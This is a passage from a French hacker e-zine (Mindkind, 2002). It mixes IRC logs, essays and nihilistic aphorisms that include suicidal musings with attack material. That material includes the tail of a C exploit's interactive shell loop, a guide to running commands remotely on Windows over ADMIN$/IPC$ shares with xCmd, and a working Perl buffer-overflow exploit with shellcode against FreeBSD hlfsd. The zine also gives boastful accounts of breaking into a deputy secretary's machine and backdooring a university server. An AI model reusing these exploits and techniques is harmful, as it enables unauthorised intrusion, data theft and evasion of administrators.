    if(i>ih) {printf("\nerror: not vulnerable\n");exit(-1);}

    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
}
/*                                w00_hoo phear aka vaL                                    */
---------------------------------------------------------------------
 
Dont forget to edit  [ #define COMMAND "  **** be creative there .. ****  " ]

---------------------------------------------------------------------

# i Hope u enjoy the lil arcticle , of course there more to come
# feel free to submit idea by email
# Realised by vaL0r on  20 November 2002
# let me know bugz or fix if u find better way to code 
# peace




            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                  val0r@mindkind.org                     /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'





   < Mindkind tales from IRC >
   < Leτon de vulgaritΘ avec Last et init >

   [03:22] &lt;init_null> 11.03 tnegra'l ed elrap elcitra teC
   [03:22] &lt;init_null> lol
   [03:22] &lt;init_null> non
   [03:22] &lt;init_null> hahaha
   [03:22] &lt;LastCall_> init
   [03:22] &lt;LastCall_> check
   [03:22] &lt;LastCall_> fait ton esti darticle
   [03:22] &lt;init_null> HAHAH
   [03:22] &lt;LastCall_> a place de penser a un esti de titre
   [03:22] &lt;LastCall_> de batnarad
   [03:22] &lt;LastCall_> de criss
   [03:22] &lt;LastCall_> de tabarnak
   [03:22] &lt;LastCall_> doesti
   [03:22] &lt;LastCall_> de siboir de criss
   [03:22] &lt;LastCall_> ;-)
   [03:22] &lt;init_null> hoho
   [03:22] &lt;init_null> des batnarad
   [03:22] &lt;init_null> sa c fou
   [03:22] &lt;init_null> lol
   [03:22] &lt;LastCall_> hahahaha
   [03:22] &lt;LastCall_> HAHAHAHA
   [03:22] &lt;LastCall_> esti
   [03:22] &lt;LastCall_> haha
   [03:23] &lt;LastCall_> 11.03 batnarad
   [03:23] &lt;LastCall_> hahaha
   [03:23] &lt;init_null> hahaha
   [03:23] &lt;LastCall_> ctun mΘlange de batman, tabarnak pis norad
   [03:23] &lt;LastCall_> hahahahahaha
   [03:23] &lt;LastCall_> HAHAHAHA
   [03:23] &lt;init_null> hahaha ouais
   [03:23] &lt;LastCall_> esti chu crampΘ la
   [03:23] &lt;LastCall_> haha
   [03:23] &lt;LastCall_> sacrament dcawliss
   [03:23] &lt;LastCall_> hehe
   [03:23] &lt;init_null> 11.03 batnarad prend l'oeuf
   [03:23] &lt;LastCall_> hahahaha
   [03:23] &lt;init_null> c bon sa
   [03:23] &lt;init_null> hahaha

  < ----------------------- >




                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.15  DΘshumanisation how-to                          \        \     !
     .             aka                                         \        \    .
     ;       We need howmuch cyborg to record santa barbara?    \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     


Aujourd'hui   nous   allons   voir   comment   les   grandes   entreprises   et
autres organismes peuvent tout simplement arriver α dΘshumaniser les gens.

Les  gens  sont  de plus  en  plus  futΘs. Les  jeunes  sont  de plus  en  plus
intelligents, entre chaque gΘnΘration, chaque nouvelle gΘnΘration de jeune  est
plus futΘ. La raison est simple, c'est pas vraiment parce que notre cerveau  se
dΘveloppe, c'est plut⌠t car la sociΘtΘ autour est plus solide est nous  apprend
plus efficacement les choses. Nous sommes venus  α un point  tel qu'il y  a  du
sang  de geek dans   nous tous  (mΩme si   c'est trΦs  minime) donc    que l'on
aime nourrir notre  cerveau avec  de l'information.

Jusque-lα, nous restons nous-mΩmes.

Par  contre,  fondamentalement,  l'Ωtre  humain se  nourrit  d'une  chose  : la
libertΘ. Cette  libertΘ est  trΦs restreinte  dans notre  monde par  des rΦgles
physiques. Exemple; les frontiΦres  de pays. Non pas  que c'est mal d'avoir une
frontiΦre entre pays,  mais imaginez-vous  si la frontiΦre  serait la porte  de
votre chambre... fatiguant passer par la douane pour aller dehors.

La libertΘ ne  pousse pas α  dΘpenser, sauf si  le produit offre  la libertΘ en
lui-mΩme. ╟a on le voit clairement quand  on regarde ce qui se passe autour  de
nous, surtout dans  le domaine de  l'informatique. Je suis  prΘsentement libre,
grΓce α ce que je sais, de pouvoir tΘlΘcharger n'importe quel musique  ou  soft
sur Internet, sans payer une cenne.

La libertΘ ne s'achΦte pas, elle se mΘrite. (Pensez aux prisons..)

Donc, les grandes compagnies ont de la difficultΘ α contr⌠ler les gens, car  le
software se copie facilement. C'est mal  pour eux, car s'ils ne vendent  pas et
se font copier, ils ont moins d'argent. Selon les compagnies, les gens  doivent
acheter, pas pirater! Par contre, les gens sont futΘs. Ils ont rΘussi α cracker
les DVD, ils ont continuΘ de sharer des fichiers MP3 sur le net...

Mais comment arrΩter des gens futΘs qui aime se servir de leurs cerveaux?

C'est simple, vous n'avez  qu'α surinformer les gens.  Un peu comme un   disque
dur qui serait rempli  α 100%. Alors lα,  on voit clairement le  moyen de leurs
fermer  la trappe.  Voilα, de   nouveaux standards,  voilα, on  vous  en  donne
beaucoup de  l'info hein?  Pourtant on  vous cache  tout(closed source)! Voilα!
Chercher  l'information...  C'est  maintenant  comme  τa  qu'on  va  occuper la
sociΘtΘ,  vous voulez   hacker bande  de  caves?  ben go,   cherchez! Continuez
de cracker, τa  donne  rien, on  va  tjrs trouver  de  quoi de  nouveau  α vous
mettre sous la dent pour pas que vous nous mordiez rΘellement.

La rΘbellion lα dedans elle est o∙? NULL PART MON CHER LASTCALL_, NULL PART. On
est trop  occupΘ α  cracker le  dernier standard  d'encryption des  DVD pour se
prΘoccuper de se dire qu'on est vraiment en calice, finalement on fait τa juste
pour le plaisir, pour passer le temps... oui mais tonton Last,
quand il crack le dvd, il combat! Non? ...et si c'Θtait un piΦge?

Si c'Θtait un piΦge finalement, tout ce temps, il Θtait prΘvu qu'on Θtait  pour
se battre, mais se battre contre des choses qui vont Ωtre remplacΘes...,  alors
que  l'argent elle,  elle  vas  toujours rester   lα..., malheureusement.  Pour
rendre cette idΘe claire,  voici deux  exemples non  rΘels sortant  de ma  pure
parano∩a: Une compagnie  de CPU qui  fabrique des  CPU  3ghz alors qu'elle  est
capable  d'en faire des  4ghz, mais ce sont  les 3ghz qui sont  produit car ils
peuvent  en vendre  plus α  la fin   du compte.   Un organisme   qui fait   de
l'encryption  et qui fait le release du 64bits, alors qu'il attend  de releaser
le 128  alors que le 64  est pas encore
crackΘ.

Vous voyez,
           vous avez beau cracker tout ce qui bouge,
           vous faite juste jouer au jeu...

Parfois, on peut se dire que  la vie est  comme τa... mais  parfois on peut  se
regarder,  pis  aussi  dire : je  vie  pour  quoi  moi?  Quel  est  mon  but  α
cracker/hacker des choses? Pour l'argent? .. et l'amour(heh)? La passion?

Si tout le monde  qui hack aurait un  esprit contr⌠lΘ par la  passion, sans une
dose d'argent, de capitalisme, on ferait autre chose que de seulement  discuter
des derniΦres technologies, des moyens des contourner, pis on s'attaquerait aux
VRAI  CHOSES. Aux  personnes derriΦres  toutes ces  merdes, aux  pensΘes et aux
idΘologies... Remarquer lα  que je tiens  pas α cracher  sur le fait de cracker
quelque chose, mais seulement  qu'il faut penser α  LONG TERME. Si je  crack un
prog pour pouvoir l'utiliser gratuitement c'est une solution α court terme,  si
je trouve une solution GPL α ce prog, alors lα c'est long terme.

Ce n'est pas du software ni du matΘriel qu'il faut cracker, c'est la mentalitΘ,
la sociΘtΘ, le tout qu'on appelle gentiment la bΩtise humaine.

C'est donc lα que  la cloche "UTOPIE LAST  UTOPIE" devrait sonner. J'avoue  que
oui, c'est utopique mon  idΘe, je vois τa  comme si tout pourrait  Ωtre beau et
qu'on vive comme  dans Star Trek,  que l'argent existe  pu vraiment.   Mais  je
crois que le meilleur moment de  faire des passes "humanistes" comme τa,  c'est
quand la sociΘtΘ  fait un virage  qu'elle est facile  α faire dΘbarquer  de ses
railles (rΘvolution! heh). Peut-Ωtre qu'on est pas encore rendu au bon  virage,
mais je  commence α  voir un  certain espoir  lα-dessus,  aprΦs tout  une seule
personne peut Ωtre puissante sur Internet, alors pourquoi que cela pourrait
pas servir α l'utopie de la libertΘ en fin de compte...

Bon.
Si vous ne voulez pas comprendre ce  qui se passe ici, ce qui est  exprimΘ ici,
et bien  _fΘlicitation_, vous  avez maintenant  compris comment dΘshumaniser le
monde..., car vous Ωtes maintenant une victime. Si par contre vous avez compris
et admis ce qui  se passe, qu'il ne  faut pas se battre  aveuglΘment, vous Ωtes
aussi une victime, mais au moins vous le saviez dΘjα.

La seule chose  qui saura vraiment  dΘterminer si un  jour nous allons  pouvoir
Ωtre libre parmi cette sociΘtΘ, c'est la journΘe que nous allons voir qui  aura
gagnΘ entre le hacker et le hackΘ (ou le cracker et le crackΘ, ou le pirate  ou
le piratΘ, ou l'argent et la libertΘ).

Pourvu que l'Θvolution se fasse du bon cotΘ.
Je vous le souhaite d'ici un million d'annΘes...


J'aimerais remercier WiL et  NeVR-C (en show comme  une page web) pour  m'avoir
inspirΘ pour ce texte. 



                                   - Essayer de faire plus parano que LastCall_


            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                lastcall@mindkind.org                    /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'





   < Mindkind tales from IRC >
   < Alcoholism is a gift >
   
   [01:18] &lt;LastCall_> tk c laid
   [01:18] &lt;LastCall_> cpour les mongoles
   [01:18] &lt;zarath> lol
   [01:19] &lt;zarath> meuh non c pour moi 
   [01:19] &lt;zarath> :P
   [01:19] &lt;XeliteX> pwet!!!
   [01:19] <[FunkY]> pwet!!!
   [01:19] &lt;XeliteX> meuh!
   [01:19] <[FunkY]> haha
   [01:19] <[FunkY]> y dit meuh..
   [01:19] &lt;XeliteX> pwet!!!
   [01:19] <[FunkY]> uhm...je bois trop..
   [01:19] &lt;LastCall_> hahahahha
   [01:19] &lt;LastCall_> HAHHAHAHA
   [01:19] &lt;LastCall_> esti
   [01:19] &lt;LastCall_> τa ctais drole
   [01:19] &lt;LastCall_> :-)

  < ----------------------- >



                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.16  IPC$ remote control                             \        \     !
     .             aka                                         \        \    .
     ;             Windows in a bdsm game                       \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     

Est-ce possible d'exΘcutΘ une ligne de commande α
distance sur une machine en NT/XP par le NetBios?
La rΘponse... OUI!
La technique est simple,  tout le monde connaεt  dΘjα la plus grande  faille de
Microsoft aprΦs IIS, le netBios, souvent appelΘ aussi le "IPC$", en fait, c'est
simple,  la faille  consiste α  se connecter  sur le  "IPC$" d'une  machine et
d'ensuite avoir droit de voir la liste  des usagers sur la machine et la  liste
des dossiers partagΘs. je n'allongerai pas sur le sujet de l'accΦs aux  fichier
sur des  ordis en  NT/XP, ceci  est une  perte de  temps puisque  tout le monde
connais le sujet depuis des annΘes.


*** Les shares finissant par $ sont cachΘs α l'utilisateur, vΘrifiez s'ils 
existent d'abord ***

Mais comment, par un de ces dossier partagΘ, est-il possible d'exΘcutΘ ?!

C'est  simple, le  share administratif  "ADMIN$" donne  des autorisations  pour
pouvoir exΘcuter  α partir  de celui  ci, voici  tout ce  que vous  devez faire
LORSQUE VOUS AVEZ  UN LOGIN/PASSWORD MEMBRE  DU GROUPE "Administrateurs".  Vous
aurez besoin de l'un de ces petits outils pour exΘcutΘ α distance, Le  premier,
REXEC.EXE, Inclut dans Windows NT/XP, simple comme bonjour mais je n'ai  jamais
rΘussit α le faire fonctionner convenablement. Voici comment l'utiliser:

REXEC h⌠te [-l utilisateur] [-n] commande

  h⌠te            H⌠te distant sur lequel la commande sera exΘcutΘe.
  -l utilisateur  Nom de l'utilisateur sur l'h⌠te distant.
  -n              Redirige l'entrΘe de REXEC sur NULL.
  commande        Commande α exΘcuter.

Le deuxiΦme, XCMD.EXE, souvent distribuΘ  avec le code source en  C, disponible
en le cherchant sur yahoo ou google. Facile d'utilisation:

xCmd v1.0 for NT4/2000 - executes commands remotely
Freeware! 2001 Zoltan Csizmadia, zoltan_csizmadia@yahoo.com

Usage: xCmd.exe \\computer [options] command/exe arguments

Options:
   /D:directory           Set working directory
                          Default: Remote "%SystemRoot%\System32"
   /IDLE                  Idle priority class
   /NORMAL                Normal priority class
   /HIGH                  High priority class
   /REALTIME              Realtime priority class
   /C                     Copy the specified program to the remote machine's
                          "%SystemRoot%\System32" directory
                          Commands's exe file must be absolute to local machine
   /USER:user             User for remote connection
   /PWD:{password|*}      Password for remote connection
   /NOWAIT                Don't wait for remote process to terminate

Examples:
   xCmd.exe \\remote cmd       // Starts a "telnet" client
   xCmd.exe \\remote /nowait runme.exe
   xCmd.exe \\remote /user:administrator dir c:\
   xCmd.exe \\remote /user:somebody /pwd:* /d:d:\ test1.exe
   xCmd.exe \\remote /c /user:somebody /pwd:* /d:d:\ test2.exe

Notes:
- Input is passed to remote machine when you press the ENTER.
- Ctrl-C terminates the remote process
- Command and file path arguments have to be absolute to remote machine
  If you are using /c option, command exe file path must be absolute to
  local machine, but the arguments must be absolute to remote machine

Donc lui il est simple et fonctionnel, suivez les exemples

NOTE: SI  VOUS ╚TES  D╔JA AUTHENTIFI╔  sur un  des shares  administratifs de la
machine, vous n'avez pas  besoin de spΘcifiΘ les  paramΦtres d'authentification
sur la  machine (/user:*  /pwd:*) et  simplement faire  xcmd \\computername cmd
pour en obtenir l'Θquivalent d'un telnet prompt ;)

Bon, maintenant je vous ai parlΘ de celui inclut dans Windows et d'un  freeware
opensource, il  y a  beaucoup d'autres  EXEs disponibles  sur le  net du  genre
xcmd.exe (un autre bon exemple: PSEXEC.EXE  mais je ne perdrai pas mon  temps α
vous  expliquer comment  il marche,  c'est similaire  α xcmd.exe  et facile  α
comprendre).

P.S.: RTFM! 

    ___          ___   ___
   / o.) _   (),' _/ ,' _/
- / o \,'o| /7_\ `. _\ `. -
 /___,'|_,'///___,'/___,' 



            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                  boiss@mindkind.org                     /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'




------------------------------- 8< cut here 8< -------------------------------

#!/usr/bin/perl
#
# Fbsd HLFSD exploit, dosen't give root since it's not seuid.
#
###########################################################
my $shout = "MindKind";
my $coder = "FunkY"; 
###########################################################

my $execv = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f" .
            "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53" .
            "\xb0\x3b\x50\xcd\x80";

my $ret   = "\x08\xf3\xbf\xbf";
my $nop   = "\x90";
my $head  = 888;       
my $body  = 108;
my $buf;
                              
#                   .:[Building buffer]:.
 
 $buf .= $shout x($head/8);
 $buf .= $ret;
 $buf .= $nop x($body-length($execv));
 $buf .= $execv;

#                 .:[Exploitation Starts]:. 
 
 system("/usr/sbin/hlfsd", "-x" , "$buf");

------------------------------- 8< cut here 8< -------------------------------





                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.17   Sadness in reflexion                           \        \     !
     .             aka                                         \        \    .
     ;             "I'm in love with my sadness"                \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                   

L'idΘe  de  se tuer   est tellement  unique en  soit, qu'on  la rejette le plus
souvent possible,  question  de garder  notre esprit prΩt et vide de tout  sens
lorsque l'occasion va se prΘsenter.

*

Aujourd'hui je veux mourir,  demain je serai  s√rement  encore  en
vie; je me vois donc dans l'obligation de dΘprimer.

*

On  a  une  conscience lorsque l'on est conscient d'en avoir une.

*
 
Mort : certificat que l'on  reτoit pour approuver que l'on α vie.

*
 
╩tre  nΘe:  devoir  porter  le  fardeau  de  devoir faire quelque chose.

*
  
La  lΓchetΘ  n'est  pas  un Θtat  physique,  mais un mode de vie.

*

Le  but  du  jeu  est  de contredire la majoritΘ, pour ensuite y
trouver une raison valable. 
 
 
*
 
Ne pas Ωtre aimΘ; ne rien devoir α personne : l'idΘal.

*

Suis-je occupΘ α vivre ou α mourir?

*

Dieu: nΘant lui-mΩme.

*
 
L'homme  qui   consacre  sa  vie  aux autres  a trΦs bien compris
l'erreur de sa naissance.

*
 
Ne cherchez pas le bonheur, il ne vous cherche pas lui-mΩme.

*

Dictionnaire  :  dΘfinition   de   certains   mots   par   X,  et 
controversΘe par Y.

*

C'est  dans  les  moments  les  plus sinistres  que  l'on  abouti
α quelque chose ... le go√t de la fin, de la dΘfaite.

*

On  comprend  toujours  les  choses  trop  tard,  pour  qu'en fin 
de compte, on ne  soit  qu'un  pseudo-activiste ...  un  penseur,
un Θcrivain.

*

Aussi dΘpressif soit-il; aussi intelligent soit-il.


*

Avoir  α  vivre,  devoir  construire  quelque  chose,  jour  aprΦs
jour, pour qu'en fin de  compte,  comme  un  mieux  que rien,  on
finisse  de  la  mΩme  faτon  que  celui qui avait tout  compris,
que celui qui n'a rien fait, qui na rien construit ... 

*

╩tre: prendre conscience que l'on a une conscience.

*

Ton ennemie: reflet de ton image.

*

Nous  finissons   tous  au   mΩme  endroit,  t⌠t ou  tard, et ce, 
pour l'ΘternitΘ. Le malheur: finir α cotΘ de son ennemie.

*

Pseudo    systΦme   socialiste ,    population    non-consciente;
population heureuse...

*

Peut-on   avoir  moins  de conscience que quelqu'un qui  n'ai pas
nΘe?

 *

Mettre  en  enfant   au  monde:   le   crime  pas excellence;  la 
vengeance d'avoir ΘtΘ nΘe.

*
   
Faute de travailler davantage, je continue α croire que  j'ai  du
talent dans quelque chose d'encore inconnu ...

*

N'acceptez pas un service, vous devrez, un jour  ou  l'autre,  le
rendre.

*

A vous  qui ne pouvais pas lire se texte, fiez-vous sur moi, Ωtre 
humain est un trop gros fardeau pour naεtre.
                                                           
*

L'idΘe  de  me dissoudre dans le mot Ωtre me semble Ωtre une perte
de  temps  inconcevable. 

*

La  dΘprime  est  l'Θtat mΩme de la rencontre avec l'idΘe du 
non-Ωtre.  

-------- 

L'histoire  de  notre  pays,  et des  pays voisins, nous permet de percevoir la
rΘalitΘ  sociale   d'en  laquelle   les  habitants   y vivent.    On  s'attache
ΘnormΘment  aux  victoires de notre pays, et on essai,  tant  bien que mal,  de
trouver  des  raisons   aux dΘfaites. Par  consΘquent,  les  amΘricains   n'ont
aucune  raison  valable de   se  laisser  marcher sur   les  pieds;  alors  que
les franτais de  France  ne  peuvent   faire  autrement   que   regretter leurs
dΘfaites,  et   d'en   trouver   les   raisons.   Plus    un   pays  gagne   en
victoires,  plus  il   semble  facile  de   continuer  α gagner.   Alors  qu'un
pays  qui  perd chaque jour, la dΘfaite ne semble point Ωtre apprivoisable.  On
a  beau   perdre  mainte    et une   fois,  cela   semble  toujours  aussi  dur
que  la  premiΦre fois,  qu'α   la  premiΦre  dΘfaite.  L'Θvolution d'un  pays,
avant qu'il ne commence α  perdre,   ou  gagner,  ce  fait  en  fonction  d'une
personne, et  la  victoire  ou  la   dΘfaite  est relatif α la puissance  d'une
pensΘ,   d'un  rΩve.   Certain  pays   sont  donc  devenus puissant    car  le
premier   fondateur   avait   dΘcider d'Ωtre puissant,  et,  du mΩme  fait,  il
se  croyait  capable   de mettre  son   rΩve  en  action.   Pour  d'autre pays,
ceux qui ont accumuler    dΘfaite   aprΦs   dΘfaite,  leurs  incapabilitΘs    α
croire  α  ce  qu'il  rΩve  est  la cause de dΘfaites  successives. Alors,  les
pays perdant  dans  l'histoire   ont  Θvoluer   avec  une  vΘritΘ acquise  avec
les  annΘes :  se  qu'on  rΩve  n'est qu'un rΩve.  Comment   leurs  prouvΘ   le
contraire?   L'histoire   vient  leur  prouvΘ  qu'ils  ont  raisons;   que   la
victoire  n'est   gagner que  par d'autres,   et  qu'ils   ne  sont   pas de se
groupe.  Pour les  habitants   de   pays   victorieux,  leur  vΘritΘ  est  tout
autre.   Gagner,   c'est   pour  eux.   Comparativement   aux  perdants qui  ne
peuvent   pas   comprendre   les    victorieux,   les gagnant  rΘussi  facile α
comprendre  pourquoi  certains  pays  n'ont  pas eut de succΦs;  ils   attribut
α  leurs  nombreuses  dΘfaites un manque de  vouloir,  un  manque  de  volontΘ,
et   un  manque   de travail.   Ce  qui    succΦde   Θtait    α  prΘvoire:   la
France n'a guΦre  digΘrer   leurs  nombreuses  dΘfaites,  et faute d'essayer de
gagner, car  ils   croient  que  gagner   ce n'est pas  pour eut, ils  essaient
tant   bien   que  mal   d'apprivoiser   leurs  dΘfaites  antΘrieures,  et  les
dΘfaites  rΘcentes.  Et de  ce  fait, perdre est  donc pour eux;  la   dΘfaite,
ils  vont  finir   par  l'aimer. Sans   pour  autant  l'apprivoiser.    Ne  pas
gagner deviendra  une normalitΘ,  et personnes  ne pourra   les  mΘpriser.  Les
pays  les  plus gagnant,  perdre  n'est   pas  une   norme,   alors que  gagner
l'est. Leurs  habitants  n'ont  aucunes   raisons  de  se  laisser tanner   par
d'autres,  et  il  associeront  leurs   victoire α la cause  de   leurs  rages.
Ils  ont subit  un  lavage de cerveau α l'Θcole  dans  leur  cours  d'histoire;
gagner, c'est ce que  le pays α  ΘtΘ capable, c'est donc  se  que  vous   serai
capable  de faire.  Par   consΘquent,   les   perdants   ne    sont   nullement
accepter,  et les  gagnants,  tricheurs   ou non,   seront  placΘs sur  la plus
haute  marche  du  podium.   Les  2  groupes  auront beau essayer de   s'aimer,
ils  ne   rΘussiront  point.   Alors on  fera  appel   α  une   forme  d'humour
nouvelle  pour   dire ce  que l'on   pense  rΘellement.   Alors  que  mΩme,  ce
qui  est le  plus dommage,  personne    de   n'autre   sociΘtΘ    nouvelle  n'a
aider  directement   aux   victoires    anciennes.    C'est    ce    que    les
perdants  continus  d'essayer de  prouver,   et  c'est  ce que les  gagnants ne
veulent pas comprendre ...

                                                           c4ndu.


            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                 c4ndu@mindkind.org                      /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'





     Un autre dicton Mindkind :
     " Fumer peut causer avec le cendrier et vous faire Θcrire dla philo "

     ___ __
     \  __ \ __ __         
      \/     _    \       
      |_____|_|____|               
      /            \                                 
     '  ( o ) ( o ) '                                  
     |              |                     
    ,'        \     |               
   (           \    '           
    '.        __)   |       )  ))()
     |              .      )(( ) )((
     |       .<>________  (() )) )(
     '       `<>--------' (())
      \            /            
       \ _     __ /     |___|     
        ___|  |_____    |   |    
       /\           \   |  (_| 
      :  \/         ,' |_)(__|  
      |  |         |/ \ |__(_|   
      '  |         :\  \/  .' 
      :  |         | '    /
      |  |         |  \__/
      '  ' ___ _ _.'   
       \ /         |        
       |/          |           
       |      +    '                         
       |      '    |                          
       |      |    :         
       '      |    |     
       |      |    /      
        '----' '--'__    
        /    \ /     |    
        '----' '-----'     ascii by c4ndu





                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.18  Mindkind Hack Reader's Digest                   \        \     !
     .             aka                                         \        \    .
     ;             .hack_hi story                               \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                    


On a dΘcidΘ  de se la  jouer α la  harlequin et de  vous proposer des  lectures
"easy" qui portent  sur des sujets  qui vous intΘressent  (α part le  sexe la).
Donc on tient α dire que tout ici  est anonyme, et pis on garanti mΩme pas  que
c'est vrai, c'est juste des histoires,  c'est de la fiction, τa existe  pas les
ordinateurs, va te coucher Jean-Paul yΘ minuit et quart.

+------------------------------------------------------------------------------+

- Des putes et des secrΘtaires

J'Θtais jeune, genre en secondaire 3 ou  4. Je scannais pour du Netbios sur  le
range de VidΘoΘtron (ne pas confondre  avec VidΘotron). Et la j'ai fini  par en
pogner  un. Un  moment donnΘ,  je me  suis rendu  compte que  j'avais pognΘ  la
secrΘtaire d'un dΘputΘ, du cube quΘbΘcois  (ne pas confondre avec le BQ).  Elle
avait tous les documents du dΘputΘ,  c'est elle qui les tapaient. Y'avait  tout
plein de renseignement  confidentiel, les comptes  de dΘpenses, des  projets de
transports en commun par aΘroglisseur  haha. J'ai downloadΘ le rΘpertoire,  pis
j'ai rit pendant des  heures. The Gazette faisait  des recours en justice  pour
avoir accΦs aux comptes de dΘpense des dΘputΘs, moi j'en avais un dans face! Le
pire la, y'ont perdu en cours :)

+------------------------------------------------------------------------------+

- Mission Take Back

On avait pognΘ  un accΦs sur  une machine dans  une universitΘ aux  USB (ne pas
confondre avec les  USA). On Θtait  vedge et on  en avait juste  de besoin pour
runner  quelques affaires,  donc on  a pas  prit la  peine de  backdoorer. Par
contre, un jour, l'admin  root c'est rendu compte  que son CPU Θtait  utilisΘ α
100% pas mal souvent et a checkΘ sa machine.. et trouvΘ John the Rapper (ne pas
confondre avec John the Ripper) dans  un directory. Y'a donc emailΘ la  machine
duquel le user c'Θtait loggΘ pour avertir  le root que un de ses users  s'Θtait
connectΘ sur son serveur pour runner  de quoi de louche. Heureusement on  avait
le root sur l'autre machine  et on a pognΘ le  email. AprΦs lavoir effacΘ on  a
essayer  de  se logger  sur  l'universitΘ, mais  l'account  Θtait disabled.  La
machine Θtait patchΘ contre l'exploit remote (ah le bon vieux red hat 5.1),  et
le seul moyen  qui nous restait  c'est d'Ωtre en  local. On a  presque give up,
alors qu'un jour je regardais le finger port, et j'ai vu quelques users  loggΘ.
J'ai faite : hum tout d'un coup que j'ai de la chance pis que ya un gars qui  a
sa machine  de open  avec son  password sur  la box!  Alors, j'ai  checkΘ, sans
succΦs. Y'avait juste du monde de loggΘ de machines interne α l'universitΘ,  et
c'Θtait du WinNT (robuste dans le  temps de NT4) pas open. Pourtant  c'Θtait le
soir trΦs tard. Je me suis alors rappelΘ que la box Θtait sur la c⌠te ouest, et
que la bas ils sont en avance  de quelque heure. Donc mon soir trΦs  tard Θtait
en faite  leur avant  midi.. J'ai  donc essayΘ  dans la  journΘe l'aprΦs midi..
bingo, il y  avait du monde  de loggΘ de  leur maison. J'ai  regardΘ... asteure
fallait que j'aille encore plus de  chance, et qu'un d'eux soit ouvert  avec le
pass α quelque part.. J'en ai regarder une couple (ah le bon vieux Netbios,  τa
marche  mieux qu'un  singe τa),  et j'ai  fini par  trouver un  gars qui  avait
SecureCRT ou  HyperTerminal (jme  rappelle pu  lequel) et  qui avait  saver son
pass. Sautant de joie, j'ai pris en note le pass, j'y suis retournΘ plus  tard.
J'ai re-rootΘ la machine  pis j'ai enfin backdoorer  τa comme du monde.  Fin de
l'histoire, la box ma durΘ un bon 2 ans aprΦs τa (on a fini par arrΩter de tout
le temps l'utiliser pour cracker.. heh).


+------------------------------------------------------------------------------+

- CΘgep Gaming

Bon toute les gars du CΘgep vont me reconnaεtre aprΦs τa, mais c'est pas  grave
c'Θtait avec τa qu'on c'est marrΘ pendant 3 ans de temps.. hehe

Au CΘgep nous on avait un trip : le prohibited gaming. Un peu comme prendre dla
drogue alors que c'est illΘgal, le gaming dans les locaux alors qu'on avait pas
le droit Θtait rendu une vrai  drogue (dΘjα que le gaming lui-mΩme  c'est assez
intense). On se ramassait tout le temps  une gagne de 4 α 16 personnes  pendant
nos temps libres (entre les cours, pendant les cours qu'on aillait pas, et  des
mΘga rumbles  le vendredi  soir). On  avait mΩme  un nom  de team qui avait les
mΩmes  abrΘviations  que  notre association  Θtudiante.  J'avoue  qu'une grande
partie du trip f√t les games de Starcraft α 8 pis de Rainbow Six α 12 000.  Les
responsables au CΘgep le  savaient trΦs bien qu'on  semait la terreur dans  les
locaux sur  l'heure du  midi, ils avaient mΩme Θcrit α la bibliothΦque sur  les
Θcrans "LE JEU EST INTERDIT".

